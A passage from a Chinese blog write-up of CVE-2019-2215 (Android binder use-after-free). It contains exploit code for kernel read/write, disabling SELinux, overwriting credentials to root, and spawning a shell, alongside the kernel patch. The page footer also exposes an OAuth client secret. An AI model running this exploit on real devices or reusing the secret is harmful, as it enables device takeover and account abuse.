</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint64_t</span> <span class=n>finalSocketData</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x1</span><span class=p>,</span>                    <span class=c1>// iovecStack[IOVEC_WQ_INDEX].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x41414141</span><span class=p>,</span>             <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>,</span>  <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                        <span class=n>OFFSET_TASK_STRUCT_ADDR_LIMIT</span><span class=p>),</span> <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0xFFFFFFFFFFFFFFFE</span>      <span class=c1>// addr_limit value
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>对应上面的值。</p><p>到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。</p><h4 id=bypass-kaslr-and-disabling-selinux>bypass kaslr and Disabling SELinux</h4><p>前面已经了有了完整的读写权限，那这就很简单了。</p><p>任意读写的实现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>kRead</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>Address</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>Length</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>uBuffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>Address</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to write data from kernel: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>uBuffer</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to read data from kernel: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>kWrite</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>Address</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>Length</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>uBuffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>uBuffer</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to write data from user: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>m_kernel_rw_pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>Address</span><span class=p>,</span> <span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>size_t</span><span class=p>)</span> <span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>Length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;[-] Failed to write data to kernel: %p&#34;</span><span class=p>,</span> <span class=n>Address</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。</p><p>task_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>ptrdiff_t</span> <span class=n>kernelBase</span> <span class=o>=</span> <span class=n>nsProxy</span> <span class=o>-</span> <span class=n>SYMBOL_OFFSET_init_nsproxy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>auto</span> <span class=n>selinuxEnforcing</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=n>kernelBase</span> <span class=o>+</span> <span class=n>SYMBOL_OFFSET_selinux_enforcing</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] nsproxy: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nsProxy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Kernel base: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>kernelBase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] selinux_enforcing: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>selinuxEnforcing</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>selinuxEnabled</span> <span class=o>=</span> <span class=n>kReadDword</span><span class=p>(</span><span class=n>selinuxEnforcing</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>selinuxEnabled</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] selinux enforcing is disabled</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] selinux enforcing is enabled</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>(</span><span class=n>selinuxEnforcing</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。</p><p>现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行</p><h4 id=root>Root</h4><p>提权的常用语句<code>commit_creds(prepare_kernel_cred(NULL));</code>，这就是常规的套路了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>uid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>gid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>suid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>sgid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>euid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>egid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>fsuid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_UID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>fsgid</span><span class=p>)),</span> <span class=n>GLOBAL_ROOT_GID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteDword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>securebits</span><span class=p>)),</span> <span class=n>SECUREBITS_DEFAULT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_inheritable</span><span class=p>)),</span> <span class=n>CAP_EMPTY_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_permitted</span><span class=p>)),</span> <span class=n>CAP_FULL_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_effective</span><span class=p>)),</span> <span class=n>CAP_FULL_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_bset</span><span class=p>)),</span> <span class=n>CAP_FULL_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>kWriteQword</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_cred</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span><span class=p>,</span> <span class=n>cap_ambient</span><span class=p>)),</span> <span class=n>CAP_EMPTY_SET</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>前面已经泄露出了task_struct->cred的地址，这里就只用将事先准备好的cred结构体写入即可</p><p>最后执行<code>system("/bin/sh");</code>、<code>execve("/system/bin/sh");</code>即可获得root权限。</p><p><img src=/img/image-20200629174038205.png loading=lazy alt=image-20200629174038205></p><h4 id=disabling-seccomp>Disabling SECCOMP</h4><p>额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>seccomp</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>mode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>seccomp_filter</span> <span class=o>*</span><span class=n>filter</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。<a class=link href=https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/ target=_blank rel=noopener>这篇文章</a>实现了绕过，感兴趣可以看一看。</p><p>对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的<a class=link href=https://github.com/chompie1337/s8_2019_2215_poc target=_blank rel=noopener>利用代码</a>，感兴趣可以看看。</p><h4 id=patch>patch</h4><p><a class=link href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target=_blank rel=noopener>patch</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>diff</span> <span class=o>--</span><span class=n>git</span> <span class=n>a</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span> <span class=n>b</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=n>a340766b51fe</span><span class=p>.</span><span class=mf>.2</span><span class=n>ef8bd29e188</span> <span class=mi>100644</span>
</span></span><span class=line><span class=cl><span class=o>---</span> <span class=n>a</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=o>+++</span> <span class=n>b</span><span class=o>/</span><span class=n>drivers</span><span class=o>/</span><span class=n>android</span><span class=o>/</span><span class=n>binder</span><span class=p>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=err>@@</span> <span class=o>-</span><span class=mi>4302</span><span class=p>,</span><span class=mi>6</span> <span class=o>+</span><span class=mi>4302</span><span class=p>,</span><span class=mi>18</span> <span class=err>@@</span> <span class=k>static</span> <span class=kt>int</span> <span class=n>binder_thread_release</span><span class=p>(</span><span class=k>struct</span> <span class=n>binder_proc</span> <span class=o>*</span><span class=n>proc</span><span class=p>,</span>
</span></span><span class=line><span class=cl> 		<span class=k>if</span> <span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 			<span class=n>spin_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>t</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>);</span>
</span></span><span class=line><span class=cl> 	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>+</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>+	 * If this thread used poll, make sure we remove the waitqueue
</span></span></span><span class=line><span class=cl><span class=cm>+	 * from any epoll data structures holding it with POLLFREE.
</span></span></span><span class=line><span class=cl><span class=cm>+	 * waitqueue_active() is safe to use here because we&#39;re holding
</span></span></span><span class=line><span class=cl><span class=cm>+	 * the inner lock.
</span></span></span><span class=line><span class=cl><span class=cm>+	 */</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	<span class=k>if</span> <span class=p>((</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>looper</span> <span class=o>&amp;</span> <span class=n>BINDER_LOOPER_STATE_POLL</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	    <span class=n>waitqueue_active</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>+</span>		<span class=n>wake_up_poll</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>,</span> <span class=n>POLLHUP</span> <span class=o>|</span> <span class=n>POLLFREE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>+</span>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>+</span>
</span></span><span class=line><span class=cl> 	<span class=n>binder_inner_proc_unlock</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>proc</span><span class=p>);</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 	<span class=k>if</span> <span class=p>(</span><span class=n>send_reply</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>在binder_thread free之前清理掉thread->wait即可。</p><h3 id=总结>总结</h3><p>去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。</p><p>后续真机测试过程中手上没pixel2 只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。</p><p>提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。</p><p>关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。</p><h4 id=参考>参考</h4><ul><li><a class=link href=https://www.52pojie.cn/thread-1083552-1-1.html target=_blank rel=noopener>https://www.52pojie.cn/thread-1083552-1-1.html</a></li><li><a class=link href=https://blog.csdn.net/weixin_43901866/article/details/102458212 target=_blank rel=noopener>https://blog.csdn.net/weixin_43901866/article/details/102458212</a></li><li><a class=link href=https://cloudfuzz.github.io/android-kernel-exploitation/ target=_blank rel=noopener>https://cloudfuzz.github.io/android-kernel-exploitation/</a></li><li><a class=link href=https://github.com/sharif-dev/AndroidKernelVulnerability target=_blank rel=noopener>https://github.com/sharif-dev/AndroidKernelVulnerability</a></li><li><a class=link href=https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/ target=_blank rel=noopener>https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/</a></li><li><a class=link href=https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/ target=_blank rel=noopener>https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/</a></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/cve/>CVE</a>
<a href=/tags/android%E6%8F%90%E6%9D%83/>Android提权</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/><div class=article-details><h2 class=article-title>在Android的个人字典中发现和利用漏洞(CVE-2018-9375)</h2></div></a></article></div></div></aside><link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css><div id=vssue></div><script src=https://unpkg.com/vue@2/dist/vue.runtime.min.js></script>
<script src=https://unpkg.com/vssue/dist/vssue..min.js></script>
<script>new Vue({el:"#vssue",render:e=>e("Vssue",{props:{title:"CVE-2019-2215分析利用记录",options:{autoCreateIssue:!0,owner:"kuekiko",repo:"ykiko",clientId:"95aae0b36f5f8169a39b",clientSecret:"b26f68955b1da8bc4fd0e24b27a6a055d15a5267"}}})})</script><footer class=site-footer><section class=copyright>&copy;
2016 -
